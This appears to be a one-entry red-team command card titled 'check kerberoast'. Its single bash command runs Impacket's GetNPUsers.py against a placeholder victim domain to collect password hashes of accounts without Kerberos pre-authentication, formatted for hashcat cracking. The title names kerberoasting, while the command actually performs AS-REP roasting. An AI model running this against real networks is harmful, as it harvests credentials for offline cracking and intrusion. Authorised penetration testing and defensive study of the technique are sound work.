---
id: 40b48d0e-f6e5-471d-9657-b05368891591
name: check kerberoast
type: command
executor: bash
data: 'python GetNPUsers.py VICTIM-DOMAIN/ -usersfile user.txt -dc-ip <IP> -format
  hashcat

  '
output: null
created_at: '2020-07-14T18:14:44.766645+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# check kerberoast

```bash
python GetNPUsers.py VICTIM-DOMAIN/ -usersfile user.txt -dc-ip <IP> -format hashcat

```
